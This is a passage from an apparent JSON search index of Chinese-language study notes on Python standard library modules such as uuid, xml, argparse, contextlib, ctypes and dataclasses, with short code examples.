UUID 的变体，它决定了 UUID 的内部布局.\n这将是 RESERVED_NCS , RFC_4122 , RESERVED_MICROSOFT 或 RESERVED_FUTURE 中的一个. UUID.version UUID 版本号（1 到 5，只有当变体为 RFC_4122 时才有意义）. UUID.is_safe 一个 SafeUUID 的枚举，表示平台是否以多进程安全的方式生成 UUID. 模块函数 uuid.getnode() 获取 48 位正整数形式的硬件地址.\n第一次运行时，它可能会启动一个单独的程序，这可能会相当慢.\n如果所有获取硬件地址的尝试都失败了，我们会按照 RFC 4122 中的建议，选择一个随机的 48 位数字，\n其多播位 (第一个八进制数的最小有效位) 设置为 1.\n\"硬件地址\"是指一个网络接口的 MAC 地址. 在一台有多个网络接口的机器上，\n普遍管理的 MAC 地址 (即第一个八位数的第二个最小有效位是 未设置的) 将比本地管理的 MAC 地址优先，但没有其他排序保证. 在 3.7 版更改: 普遍管理的MAC地址优于本地管理的MAC地址，因为前者保证是全球唯一的，而后者则不是. uuid.uuid1(node=None, clock_seq=None) 基于时间戳 根据主机 ID、序列号和当前时间生成一个 UUID. 如果没有给出 node，则使用 getnode() 来获取硬件地址(MAC地址), 虽然保证了全球的唯一, 但会有安全问题(MAC地址唯一).\n所以局域网中 node 可以使用 ip 地址. 如果给出了 clock_seq，它将被用作序列号；否则将选择一个随机的 14 比特位序列号. uuid.uuid3(namespace, name) 基于名字的MD5散列值 根据命名空间标识符（这是一个UUID）和名称（这是一个字符串）的MD5哈希值，生成一个UUID. uuid.uuid4() 基于随机数 生成一个随机的UUID. 由伪随机数得到，有一定的重复概率，该概率可以计算出来。 uuid.uuid5(namespace, name) 基于名字的SHA-1散列值 与uuid3类似, 根据命名空间标识符（这是一个UUID）和名称（这是一个字符串）的SHA-1哈希值生成一个UUID. 注解 其实还有一个uuid2, 基于分布式计算环境DCE, 不过python没有 算法与uuid1相同，不同的是把时间戳的前4位置换为POSIX的UID。实际中很少用到该方法。 命名空间标识符 uuid 模块定义了以下命名空间标识符，供 uuid3() 或 uuid5() 使用. uuid.NAMESPACE_DNS 当指定 namespace 为此值时, name值为域名(domain name) uuid.NAMESPACE_URL 当指定这个命名空间时，name 字符串是一个 URL. uuid.NAMESPACE_OID 当指定这个命名空间时，name 字符串是一个 ISO OID. uuid.NAMESPACE_X500 当指定这个命名空间时，name 字符串是 DER 或文本输出格式的 X.500 DN. uuid 模块为 variant 属性的可能值定义了以下常量: uuid.RESERVED_NCS 为NCS兼容性保留. uuid.RFC_4122 指定 RFC 4122 中给出的 UUID 布局. uuid.RESERVED_MICROSOFT 为微软的兼容性保留. uuid.RESERVED_FUTURE 保留给未来的定义.","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-UUID.html","loc":"/yq-docs-rear-end-python-python-standard-library-UUID.html"},{"title":"xml","text":"官网: https://docs.python.org/zh-cn/3/library/xml.html 处理 XML 的模块. 警告 XML 模块对于错误或恶意构造的数据是不安全的。\n如果你需要解析不受信任或未经身份验证的数据，请使用 defusedxml 包: pip install defusedxml XML 处理子模块包括: xml.etree.ElementTree： ElementTree API，一个简单而轻量级的XML处理器 xml.dom：DOM API 定义 xml.dom.minidom：最小的 DOM 实现 xml.dom.pulldom：支持构建部分 DOM 树 xml.sax：SAX2 基类和便利函数 xml.parsers.expat：Expat解析器绑定 暂时只说常用的 xml.etree.ElementTree xml.etree.ElementTree 详见: https://docs.python.org/zh-cn/3/library/xml.etree.elementtree.html#module-xml.etree.ElementTree 实现了一个简单高效的API，用于解析和创建XML数据。 阻塞获取文件数据: import xml.etree.ElementTree as ET\n\ntree = ET.parse('country_data.xml')\nroot = tree.getroot() 如果XML数据直接是字符串: root = ET.fromstring(country_data_as_string) root 具有标签和属性字典: >>> root.tag\n'data'\n\n>>> root.attrib\n{} ElementTree方法: find() iterfind() findtext() iterparse() 命令空间的说明 在 XML 文档中,xmlns:s 和 xmlns 都用于定义命名空间,但有以下区别: xmlns:s 定义的是命名空间前缀 ,语法是: xmlns:s=\"http://www.w3.org/ns/example\" 这定义了一个名称为 \"s\" 的命名空间前缀,指向 \" http://www.w3.org/ns/example \" 这个命名空间。\n然后在元素中,使用 \"s:\" 前缀来指示这个元素属于这个命名空间: <s:name>John</s:name> xmlns 定义的是默认命名空间 ,语法是: xmlns=\"http://www.w3.org/ns/example\" 这定义了默认命名空间为 \" http://www.w3.org/ns/example \"。\n然后该默认命名空间作用域内的所有元素都属于这个命名空间,无须使用前缀: <name>John</name> 当 XML 文档中只定义一个命名空间时,通常使用默认命名空间。当定义多个命名空间,又想区分元素属于哪个命名空间时,才需要使用命名空间前缀. 如果一个元素既定义了默认命名空间,又定义了命名空间前缀,此时: 无前缀的元素属于默认命名空间 使用前缀的元素属于相应的命名空间 命名空间的处理 若使用映射字典: namespaces = {\n    's': 'http://schemas.xmlsoap.org/soap/envelope/',\n    'u': 'urn:schemas-upnp-org:service:ContentDirectory:1'\n}\nbody = envelope.find('Body', namespaces) 这里,我们传入了一个字典,将前缀`s`映射到SOAP envelope命名空间,前缀`u`映射到UPnP ContentDirectory服务的命名空间。\n这样,在查找元素时,我们可以使用前缀来限定命名空间,例如: browse = body.find('{urn:schemas-upnp-org:service:ContentDirectory:1}Browse') 等同于: browse = body.find('u:Browse', namespaces)","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-XML.html","loc":"/yq-docs-rear-end-python-python-standard-library-XML.html"},{"title":"argparse","text":"基本使用模板: # 导入argparse\nimport argparse\n\nparser = argparse.ArgumentParser(description=\"Demo of argparse\")  # 生成argparse对象\nparser.add_argument('-n','--name', default=' Li ')          # 增加参数\nargs = parser.parse_args()                                  # 获取 add_argument参数列表: default         # add_argument\nrequired        # 这个参数是否一定需要设置\ntype            # 参数类型\nchoices         # 参数值只能从几个选项里面选择\nhelp            # 指定参数的说明信息\ndest            # 设置参数在代码中的变量名\n\nnargs           # 设置参数在使用可以提供的个数\n          # 值      含义\n             N    # 参数的绝对个数（例如：3）\n            '?'   # 0或1个参数\n            '*'   # 0或所有参数\n            '+'   # 所有，并且至少一个参数 例: parser.add_argument('-n', defalut=1, required=True, type=int, choices=[1,2,3], help='is number', dest=iNum, nargs='?') 例子: import argparse\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"Demo of argparse\")\n    parser.add_argument('-n','--name', default=' Li ')\n    parser.add_argument('-y','--year', default='20')\n    args = parser.parse_args()\n    print(args)\n    name = args.name\n    year = args.year\n    print('Hello {}  {}'.format(name,year))\n\nif __name__ == '__main__':\n    main()","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-argparse.html","loc":"/yq-docs-rear-end-python-python-standard-library-argparse.html"},{"title":"atexit","text":"官网: https://docs.python.org/zh-cn/3/library/atexit.html 退出处理器, 更正确一点来说, 是程序正常退出时候的退出处理器. atexit 模块定义了清理函数的注册和反注册函数.\n被注册的函数会在解释器正常终止时执行. atexit 会按照注册顺序的*逆序*执行;\n如果你注册了 A, B 和 C, 那么在解释器终止时会依序执行 C, B, A. 注解 通过该模块注册的函数, 在程序被未被 Python 捕获的信号杀死时并不会执行,\n在检测到 Python 内部致命错误以及调用了 os._exit() 时也不会执行. 提供的两个api atexit.register(func, *args, **kwargs) 将 func 注册为终止时执行的函数.\n任何传给 func 的可选的参数都应当作为参数传给 register().\n可以多次注册同样的函数及参数. 在正常的程序终止时 (举例来说, 当调用了 sys.exit() 或是主模块的执行完成时),\n所有注册过的函数都会以后进先出的顺序执行.\n这样做是假定更底层的模块通常会比高层模块更早引入, 因此需要更晚清理. 如果在 exit 处理句柄执行期间引发了异常，\n将会打印回溯信息 (除非引发的是 SystemExit) 并且异常信息会被保存。\n在所有 exit 处理句柄都获得运行机会之后，所引发的最后一个异常会被重新引发。 这个函数返回 func 对象，可以把它当作装饰器使用。但只有在函数不需要任何参数调用时才能工作. atexit.unregister(func) 将 func 移出当解释器关闭时要运行的函数列表。\n如果 func 之前未被注册则 unregister() 将静默地不做任何事。\n如果 func 已被注册一次以上，则该函数每次在 atexit 调用栈中的出现都将被移除。\n当取消注册时会在内部使用相等性比较 (==)，因而函数引用不需要具有匹配的标识号。","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-atexit.html","loc":"/yq-docs-rear-end-python-python-standard-library-atexit.html"},{"title":"cmath","text":"复数计算支持","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-cmath.html","loc":"/yq-docs-rear-end-python-python-standard-library-cmath.html"},{"title":"contextlib","text":"contextlib --- 为 with语句上下文提供的工具 官网: https://docs.python.org/zh-cn/3/library/contextlib.html 此模块为涉及 with 语句的常见任务提供了实用的工具。 常用的两个装饰器: @contextlib.contextmanager @contextlib.asynccontextmanager @contextlib.contextmanager 这个函数是一个 decorator ，它可以定义一个支持 with 语句上下文管理器的工厂函数，\n而不需要创建一个类或区 __enter__() 与 __exit__() 方法。 尽管许多对象原生支持使用 with 语句，但有些需要被管理的资源并不是上下文管理器，\n并且没有实现 close() 方法而不能使用 contextlib.closing 。 示例，展示如何确保正确的资源管理: from contextlib import contextmanager\n\n@contextmanager\ndef managed_resource(*args, **kwds):\n    # Code to acquire resource, e.g.:\n    resource = acquire_resource(*args, **kwds)\n    try:\n        yield resource\n    finally:\n        # Code to release resource, e.g.:\n        release_resource(resource)\n\nwith managed_resource(timeout=3600) as resource:\n    # Resource is released at the end of this block,\n    # even if code in the block raises an exception 被装饰的函数在被调用时，必须返回一个 generator 迭代器。\n这个迭代器必须只 yield 一个值出来，这个值会被用在 with 语句中，绑定到 as 后面的变量，如果给定了的话。 当生成器发生 yield 时，嵌套在 with 语句中的语句体会被执行。\n语句体执行完毕离开之后，该生成器将被恢复执行。\n如果在该语句体中发生了未处理的异常，则该异常会在生成器发生 yield 时重新被引发。\n因此，你可以使用 try...except...finally 语句来捕获该异常（如果有的话），或确保进行了一些清理。\n如果仅出于记录日志或执行某些操作（而非完全抑制异常）的目的捕获了异常，生成器必须重新引发该异常。\n否则生成器的上下文管理器将向 with 语句指示该异常已经被处理，程序将立即在 with 语句之后恢复并继续执行。 contextmanager() 使用 ContextDecorator 因此它创建的上下文管理器不仅可以用在 with 语句中，还可以用作一个装饰器。\n当它用作一个装饰器时，每一次函数调用时都会隐式创建一个新的生成器实例\n（这使得 contextmanager() 创建的上下文管理器满足了支持多次调用以用作装饰器的需求，而非\"一次性\"的上下文管理器）。 @contextlib.asynccontextmanager 与 contextmanager() 类似，但创建的是 asynchronous context manager 异步的上下文管理器 。 这个函数是一个 decorator ，它可以定义一个支持 async with 语句的异步上下文管理器的工厂函数，\n而不需要创建一个类或区分 __aenter__() 与 __aexit__() 方法。它必须被作用在一个 asynchronous generator 函数上 一个简单的示例: from contextlib import asynccontextmanager\n\n@asynccontextmanager\nasync def get_connection():\n    conn = await acquire_db_connection()\n    try:\n        yield conn\n    finally:\n        await release_db_connection(conn)\n\nasync def get_all_users():\n    async with get_connection() as conn:\n        return conn.query('SELECT ...') 3.7 新版功能. 使用 asynccontextmanager() 定义的 上下文管理器可以用作装饰器 : import time\nfrom contextlib import asynccontextmanager\n\n@asynccontextmanager\nasync def timeit():\n    now = time.monotonic()\n    try:\n        yield\n    finally:\n        print(f'it took {time.monotonic() - now}s to run')\n\n@timeit()\nasync def main():\n    # ... async code ... 用作装饰器时，每次函数调用都会隐式创建一个新的生成器实例。\n这使得由 asynccontextmanager() 创建的 \"一次性\" 上下文管理器能够满足作为装饰器所需要的支持多次调用的要求。 在 3.10 版更改: 使用 asynccontextmanager() 创建的异步上下文管理器可以用作装饰器。 contextlib.closing(thing) 返回一个在语句块执行完成时关闭 things 的上下文管理器。这基本上等价于: from contextlib import contextmanager\n\n@contextmanager\ndef closing(thing):\n    try:\n        yield thing\n    finally:\n        thing.close() 并允许你编写这样的代码: from contextlib import closing\nfrom urllib.request import urlopen\n\nwith closing(urlopen('https://www.python.org')) as page:\n    for line in page:\n        print(line) 而无需显式地关闭 page 。 即使发生错误，在退出 with 语句块时， page.close() 也同样会被调用。 contextlib.aclosing(thing) 返回一个在语句块执行完成时调用 aclose() 方法来关闭 things 的异步上下文管理器。这基本上等价于: from contextlib import asynccontextmanager\n\n@asynccontextmanager\nasync def aclosing(thing):\n    try:\n        yield thing\n    finally:\n        await thing.aclose() 重要的是，aclosing() 支持在异步生成器因遭遇 break 或异常而提前退出时对其执行确定性的清理。 例如: from contextlib import aclosing\n\nasync with aclosing(my_generator()) as values:\n    async for value in values:\n        if value == 42:\n            break 此模块将确保生成器的异步退出代码在与其迭代相同的上下文中执行\n（这样异常和上下文变量将能按预期工作，并且退出代码不会在其所依赖的某些任务的生命期结束后继续运行）。 3.10 新版功能.","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-contextLib.html","loc":"/yq-docs-rear-end-python-python-standard-library-contextLib.html"},{"title":"contextvars","text":"官网文档: https://docs.python.org/zh-cn/3/library/contextvars.html 上下文变量 本模块提供了相关API用于管理、存储和访问上下文相关的状态。\nContextVar 类用于声明 上下文变量 并与其一起使用。\n函数 copy_context()  和类 Context 用于管理当前上下文和异步框架中。 在多并发环境中，有状态上下文管理器应该使用上下文变量，\n而不是 threading.local() 来防止他们的状态意外泄露到其他代码 注解 在异步/多并发环境中(多进程/多线程都属于多并发), ContextVar(xxx).get() 获取的值是实时同步的最新的 ContextVar通过共享内存的方式提供了一种更轻量和Pythonic的不同任务间共享状态的机制.\n但不适合不同进程间通信; 如果需要跨进程,还是更建议使用 from multiprocessing import Manager 常用有ContextVar class contextvars.ContextVar(name[, *, default]) 此类用于声明一个新的上下文变量，如: var: ContextVar[int] = ContextVar('var', default=42) name: 上下文变量的名称，只读属性; 用于内省和调试，必需. 调用 ContextVar.get() 时，如果上下文中没有找到此变量的值，则返回可选的仅命名参数 default 。 重要 上下文变量应该在顶级模块中创建，且永远不要在闭包中创建。\nContext 对象拥有对上下文变量的强引用，这可以让上下文变量被垃圾收集器正确回收。 3.7.1 新版功能. get([default]) 返回当前上下文中此上下文变量的值。 如果当前上下文中此变量没有值，则此方法会: 如果提供了 default，返回其值；或者\n返回上下文变量本身的默认值， 如果创建此上下文变量时提供了默认值；或者\n抛出 LookupError 异常。 set(value) 调用此方法设置上下文变量在当前上下文中的值。 必选参数 value 是上下文变量的新值。 返回一个 Token  对象，可通过 ContextVar.reset() 方法将上下文变量还原为之前某个状态。 reset(token) 将上下文变量重置为调用 ContextVar.set() 之前、创建 token 时候的状态。 例如: var = ContextVar('var')\n\ntoken = var.set('new value')\n# code that uses 'var'; var.get() returns 'new value'.\nvar.reset(token)\n\n# After the reset call the var has no value again, so\n# var.get() would raise a LookupError. ContextVar-用例 code: CONTEXT_EXAMPLE = ContextVar('context-example', default=list())","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-contextvars.html","loc":"/yq-docs-rear-end-python-python-standard-library-contextvars.html"},{"title":"ctypes","text":"常用于加载C(++)模块 C与Python与ctypes类型 C Type Python Type ctypes Type char 1-character string c_char wchar_t 1-character Unicode string c_wchar char int/long c_byte char int/long c_ubyte short int/long c_short unsigned short int/long c_ushort int int/long c_int unsigned int int/long c_uint 1ong int/long c_long unsigned long int/long c_ulong long long int/long c_longlong unsigned long long int/long c_ulonglong float float c float double float c_double char * (NULL terminated) string or none c_charp wchar_t * (NULL terminated) unicode or none c_wchar_p void * int/long or none c_void_P 搜索库 模糊搜索本地存在的库: In [2]: from ctypes.util import find_library\n\nIn [3]: find_library('SensApi')         # 本地没有\n\nIn [4]: find_library('pthread')\nOut[4]: '/usr/lib/libpthread.dylib' 加载 加载dll, 如Windows下存在 SensApi.dll , 试加载: In [5]: import ctypes\n\nIn [6]: ctypes.cdll.LoadLibrary('SensApi')\n---------------------------------------------------------------------------\nOSError                                   Traceback (most recent call last)\nCell In [6], line 1\n----> 1 ctypes.cdll.LoadLibrary('SensApi')\n\nFile /usr/local/Cellar/python@3.9/3.9.10/Frameworks/Python.framework/Versions/3.9/lib/python3.9/ctypes/__init__.py:452, in LibraryLoader.LoadLibrary(self, name)\n        451 def LoadLibrary(self, name):\n--> 452     return self._dlltype(name)\n\nFile /usr/local/Cellar/python@3.9/3.9.10/Frameworks/Python.framework/Versions/3.9/lib/python3.9/ctypes/__init__.py:374, in CDLL.__init__(self, name, mode, handle, use_errno, use_last_error, winmode)\n        371 self._FuncPtr = _FuncPtr\n        373 if handle is None:\n--> 374     self._handle = _dlopen(self._name, mode)\n        375 else:\n        376     self._handle = handle\n\nOSError: dlopen(SensApi, 0x0006): tried: 'SensApi' (no such file), '/System/Volumes/Preboot/Cryptexes/OSSensApi' (no such file), '/usr/local/lib/SensApi' (no such file), '/System/Volumes/Preboot/Cryptexes/OS/usr/local/lib/SensApi' (no such file), '/usr/local/lib/SensApi' (no such file), '/System/Volumes/Preboot/Cryptexes/OS/usr/local/lib/SensApi' (no such file), '/usr/lib/SensApi' (no such file, not in dyld cache), 'SensApi' (no such file), '/usr/local/lib/SensApi' (no such file), '/usr/lib/SensApi' (no such file, not in dyld cache)\n\nIn [7]: ctypes.cdll.LoadLibrary('libpthread.dylib')\nOut[7]: <CDLL 'libpthread.dylib', handle 485a6f120 at 0x107bac220>\n\nIn [8]: ctypes.cdll.LoadLibrary('/usr/lib/libpthread.dylib')\nOut[8]: <CDLL '/usr/lib/libpthread.dylib', handle 485a6f120 at 0x1081f3a60>\n\nIn [9]: 可以看出, 若只给一个模糊路径, 会在环境变量下查找是否存在, 不存在就报错. 若存在, 用绝对路径还是相对路径加载差距不大(除非在多个环境变量下包含同名库的不同实现). 定义结构体 C级别: /* A C data structure */\ntypedef struct Point {\n        double x,y;\n} Point; Python级别, 以类的形式定义, _fields_ 定义其内变量: import ctypes\n# struct Point { }\nclass Point(ctypes.Structure):\n        _fields_ = [\n                ('x', ctypes.c_double),\n                ('y', ctypes.c_double)] 访问C级别函数 注: 此处的 Point 已在上定义. C函数: /* Function involving a C data structure */\ndouble distance(Point *p1, Point *p2) {\n        return hypot(p1->x - p2->x, p1->y - p2->y);\n} Python加载: # _mod = ctypes.cdll.LoadLibrary(_path)\n# double distance(Point *, Point *)\ndistance = _mod.distance\ndistance.argtypes = (ctypes.POINTER(Point), ctypes.POINTER(Point))\ndistance.restype = ctypes.c_double 使用动态库 示例-使用动态库libc打印输出: # 系统: Mac\n\n      from ctypes import CDLL, c_char_p\n      from ctypes.util import find_library\n\n\n      def do_c_print(data: str):\n                      # libc = CDLL(\"/Library/Developer/CommandLineTools/usr/lib/libclang.dylib\")\n                      libc = CDLL(\"libc.dylib\")\n                      lib_path = find_library(\"libc.dylib\")\n\n                      # 正确输出\n                      libc.printf(b\"do_c_print0: %s\\n\", c_char_p(bytes(data, 'utf8')))\n                      libc.printf(b\"do_c_print1: %s\\n\", bytes(data, 'utf8'))\n                      libc.printf(b\"do_c_print1: %s\\nlib path: %s\\n\", bytes(data, 'utf8'), bytes(lib_path, 'utf8'))\n\n                      # 不行, 必须转换为字节\n                      libc.printf(\"do_c_print: %s\\n\\n\", data)\n\n\n      if __name__ == '__main__':\n                      do_c_print(\"it is a c print message\") 可能是C那边是字节处理的原因, 所以调用的时候, Python的Unicode风格字符串\n必须 转换为字节 才能被正常调用. 另外, find_library 好像找路径有点问题, 打印出来的结果是: /usr/lib/libc.dylib 但是实际系统找不到: $ ls /usr/lib/libc.dylib\nls: /usr/lib/libc.dylib: No such file or directory 注解 argtypes 绑定形参列表类型 restype 绑定函数返回类型 注意类型签名绑定是比较重要的, 否则可能代码不能正常运行, 甚至导致整个Python解释器挂掉, 故建议进行签名绑定.","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-ctypes.html","loc":"/yq-docs-rear-end-python-python-standard-library-ctypes.html"},{"title":"dataclasses","text":"官网: https://docs.python.org/zh-cn/3/library/dataclasses.html 提供了一个装饰器和一些函数，用于自动添加生成的 special method，例如 __init__() 和 __repr__() 到用户定义的类。 装饰器使用 @dataclasses.dataclass(*, init=True, repr=True, eq=True, order=False, unsafe_hash=False, frozen=False, match_args=True, kw_only=False, slots=False, weakref_slot=False) dataclass() 装饰器会检查类以查找 具有 类型标注 的 类变量 类属性的默认值 dataclasses.field(*, default=MISSING, default_factory=MISSING, init=True, repr=True, hash=None, compare=True, metadata=None, kw_only=MISSING) 对于被 dataclasses 装饰的数据类, 有时候 类变量的默认值 是较复杂的类型, 这时候就可以使用 field 方式来定义其默认值 default: 可选, 表示此变量的默认值 default_factory 可选, 必须是一个零参数可调用对象，当该字段需要一个默认值时，它将被调用。可以用于指定具有可变默认值的字段 与 default 的区别是: default 与 default_factory 仅可显示指定一个 default 制定的值将会在多个对象之间共享; default_factory 指定的工程, 每个对象生成的值是独立的, 仅用于可变类型 default可以是\"任何可调用对象\"，包括函数、lambda表达式、staticmethod等; 而default_factory必须是一个函数。 注意: 同时指定 default 和 default_factory 将产生错误。 init: bool = True 如果为true（默认值），则该字段作为参数包含在生成的 __init__() 方法中。 repr: bool = True 如果为true（默认值），则该字段包含在生成的 __repr__() 方法返回的字符串中。 hash: bool = None 如果为true，则此字段包含在生成的 __hash__() 方法中。如果为 None （默认值），请使用 compare 的值，这通常是预期的行为。如果字段用于比较，则应在 hash 中考虑该字段。不鼓励将此值设置为 None 以外的任何值。 设置 hash=False 但 compare=True 的一个可能原因是，如果一个计算 hash 的代价很高的字段是检验等价性需要的，但还有其他字段可以计算类型的 hash 。 即使从 hash 中排除某个字段，它仍将用于比较。 compare: bool = True 如果为true（默认值），则该字段包含在生成的相等性和比较方法中（ __eq__() ， __gt__() 等等）。 metadata: dict = None 这可以是映射或 None 。 None 被视为一个空的字典。这个值包含在 MappingProxyType() 中，使其成为只读，并暴露在 Field 对象上。数据类根本不使用它，它是作为第三方扩展机制提供的。多个第三方可以各自拥有自己的键值，以用作元数据中的命名空间。 kw_only: 如果为真值，则此字段将被标记为仅限关键字。 这将在当计算出所生成的 __init__() 方法的形参时被使用。 如果通过调用 field() 指定字段的默认值，则该字段的类属性将替换为指定的 default 值。\n如果没有提供 default ，那么将删除类属性。目的是在 dataclass() 装饰器运行之后，类属性将包含字段的默认值，就像指定了默认值一样。\n例如: @dataclass\nclass C:\n  x: int\n  y: int = field(repr=False)\n  z: int = field(repr=False, default=10)\n  t: int = 20 类属性 C.z 将是 10 ，类属性 C.t 将是 20，类属性 C.x 和 C.y 将不设置(因为 没设置默认值 )。 Field 对象描述每个定义的字段。这些对象在内部创建，并由 fields() 模块级方法返回（见下文）。用户永远不应该直接实例化 Field 对象。 其有文档的属性是： name ：字段的名字。\ntype ：字段的类型。\ndefault, default_factory, init, repr, hash, compare, metadata 和 kw_only 具有与 field() 函数中对应参数相同的含义和值。\n可能存在其他属性，但它们是私有的，不能被审查或依赖。 dataclasses.fields(class_or_instance) 返回 Field 对象的元组，用于定义此数据类的字段。 接受数据类或数据类的实例。如果没有传递一个数据类或实例将引发 TypeError 。 不返回 ClassVar 或 InitVar 的伪字段。 dataclasses.asdict(obj, *, dict_factory=dict) 将数据类``obj``转换为一个字典（通过使用工厂函数``dict_factory``）。 每个数据类被转换为其字段的字典，作为``name: value``键值对。数据类、字典、列表和元组被递归到。 其他对象用 copy.deepcopy() 来复制。 在嵌套的数据类上使用 asdict() 的例子: @dataclass\nclass Point:\n  x: int\n  y: int\n\n@dataclass\nclass C:\n  mylist: list[Point]\n\np = Point(10, 20)\nassert asdict(p) == {'x': 10, 'y': 20}\n\nc = C([Point(0, 0), Point(10, 4)])\nassert asdict(c) == {'mylist': [{'x': 0, 'y': 0}, {'x': 10, 'y': 4}]} 要创建一个浅拷贝，可以使用以下方法: dict((field.name, getattr(obj, field.name)) for field in fields(obj)) 如果 obj 不是一个数据类实例, asdict() 引发 TypeError 。 dataclasses.astuple(obj, *, tuple_factory=tuple) 将数据类``obj``转换为一个元组（通过使用工厂函数``tuple_factory``）。 每个数据类被转换为其字段值的元组。数据类、字典、列表和元组被递归到。其他对象用 copy.deepcopy() 来复制。 继续前一个例子: assert astuple(p) == (10, 20)\nassert astuple(c) == ([(0, 0), (10, 4)],) 要创建一个浅拷贝，可以使用以下方法: tuple(getattr(obj, field.name) for field in dataclasses.fields(obj)) 如果``obj``不是一个数据类实例， astuple() 引发 TypeError 。 dataclasses.make_dataclass(cls_name, fields, *, bases=(), namespace=None, init=True, repr=True, eq=True, order=False, unsafe_hash=False, frozen=False, match_args=True, kw_only=False, slots=False, weakref_slot=False) 与使用装饰器 @dataclasses 的效果一致 此函数不是严格要求的，因为用于任何创建带有 __annotations__ 的新类的 Python 机制都可以应用 dataclass() 函数将该类转换为数据类。提供此功能是为了方便。例如: C = make_dataclass('C',\n        [('x', int),\n          'y',\n          ('z', int, field(default=5))],\n        namespace={'add_one': lambda self: self.x + 1}) 等价于: @dataclass\nclass C:\n  x: int\n  y: 'typing.Any'\n  z: int = 5\n\n  def add_one(self):\n    return self.x + 1 dataclasses.replace(obj, /, **changes) 创建一个与``obj``类型相同的新对象，将字段替换为来自``changes``的值。如果``obj``不是数据类，则引发 TypeError 。如果``changes``里面的值没有指定字段，引发 TypeError 。 新返回的对象通过调用数据类的 __init__() 方法创建。这确保了如果存在 __post_init__() ，其也被调用。 如果存在没有默认值的仅初始化变量，必须在调用 replace() 时指定，以便它们可以传递给 __init__() 和 __post_init__() 。 changes 包含任何定义为 init=False 的字段是错误的。在这种情况下会引发 ValueError 。 提前提醒 init=False 字段在调用 replace() 时的工作方式。如果它们完全被初始化的话，它们不是从源对象复制的，而是在 __post_init__() 中初始化。估计 init=False 字段很少能被正确地使用。如果使用它们，那么使用备用类构造函数或者可能是处理实例复制的自定义 replace() （或类似命名的）方法可能是明智的。 dataclasses.is_dataclass(obj) 如果其形参为 dataclass 或其实例则返回 True，否则返回 False。 如果你需要知道一个类是否是一个数据类的实例（而不是一个数据类本身），那么再添加一个 not isinstance(obj, type) 检查 注解 使用 @dataclasses 时, __init__() 方法将会调用 __post_init__() 方法 且具有继承关系的类时, __init__() 不会实现基类的 __init__(), 故有需求可以在 __post_init__() 里调用 具有继承关系时, 参数为其变量声明顺序(变量类型默认值会被覆盖). 关键字字段具有重新排序: 先顺序普通字段, 再顺序关键字字段. 类属性 dataclasses.MISSING 一个表示缺失 default 或 default_factory 的监视值。 dataclasses.KW_ONLY 一个用作类型标注的监视值。 任何在伪字段之后的类型为 KW_ONLY 的字段会被标记为仅限关键字字段。\n请注意在其他情况下 KW_ONLY 类型的伪字段会被完全忽略。\n这包括此类字段的名称。 根据惯例，名称 _ 会被用作 KW_ONLY 字段。\n仅限关键字字段指明当类被实例化时 __init__() 形参必须以关键字形式来指定。\n可用于 关键字字段重排序 . 在这个例子中，字段 y 和 z 将被标记为仅限关键字字段: @dataclass\nclass Point:\n    x: float\n    _: KW_ONLY\n    y: float\n    z: float\n\np = Point(0, y=1.5, z=2.0) 在单个数据类中，指定一个以上 KW_ONLY 类型的字段将导致错误。 继承时顺序 继承时, 顺序按照定义顺序, 但是类型会被覆盖(Python继承MRO机制): @dataclass\nclass Base:\n    x: Any = 15.0\n    y: int = 0\n\n@dataclass\nclass C(Base):\n    z: int = 10\n    x: int = 15 最后的字段列表依次是 x 、 y 、 z 。 x 的最终类型是 int ，如类 C 中所指定的那样。\n类似: def __init__(self, x: int = 15, y: int = 0, z: int = 10): ... 关键字字段重排序 仅限关键字字段的重新排序-使用 KW_ONLY 在计算出 __init__() 所需要的形参之后，任何仅限关键字形参会被移至所有常规（非仅限关键字）形参的后面。\n这是 Python 中实现仅限关键字形参所要求的：它们必须位于非仅限关键字形参之后。 在这个例子中，Base.y, Base.w, and D.t 是仅限关键字字段，而 Base.x 和 D.z 是常规字段: @dataclass\nclass Base:\n    x: Any = 15.0\n    _: KW_ONLY\n    y: int = 0\n    w: int = 1\n\n@dataclass\nclass D(Base):\n    z: int = 10\n    # 注意这里也有 kw_only 参数\n    t: int = field(kw_only=True, default=0) 结果近似: def __init__(self, x: Any = 15.0, z: int = 10, *, y: int = 0, w: int = 1, t: int = 0): ...","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-dataclasses.html","loc":"/yq-docs-rear-end-python-python-standard-library-dataclasses.html"},{"title":"datetime","text":"与 time 类似,\n区别如下 time: 提供了与时间有关的函数和类型，包括获取当前时间、将时间戳转换为人类可读格式等 datetime: 提供了更灵活和强大的日期和时间操作功能，包括日期算术、日期格式化等。 示例: import datetime\n\n# 获取当前日期和时间\nnow = datetime.datetime.now()\nprint(now)\n\n# 格式化日期字符串\ndate_str = now.strftime('%Y-%m-%d %H:%M:%S')\nprint(date_str)","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-datetime.html","loc":"/yq-docs-rear-end-python-python-standard-library-datetime.html"},{"title":"decimal","text":"","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-decimal.html","loc":"/yq-docs-rear-end-python-python-standard-library-decimal.html"},{"title":"dis","text":"官网: dis --- Python 字节码反汇编器 通过反汇编支持CPython的 bytecode 分析。\n该模块作为输入的 CPython 字节码在文件 Include/opcode.h 中定义，并由编译器和解释器使用。 CPython 实现细节： 字节码是 CPython 解释器的实现细节。\n不保证不会在Python版本之间添加、删除或更改字节码。不应考虑将此模块的跨 Python VM 或 Python 版本的使用。 示例：给出函数 myfunc(): def myfunc(alist):\n    return len(alist) the following command can be used to display the disassembly of myfunc(): >>>\ndis.dis(myfunc)\n  2           0 RESUME                   0\n\n  3           2 LOAD_GLOBAL              1 (NULL + len)\n            14 LOAD_FAST                0 (alist)\n            16 PRECALL                  1\n            20 CALL                     1\n            30 RETURN_VALUE","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-dis.html","loc":"/yq-docs-rear-end-python-python-standard-library-dis.html"},{"title":"fileinput","text":"官网: https://docs.python.org/zh-cn/3/library/fileinput.html 迭代来自多个输入流的行 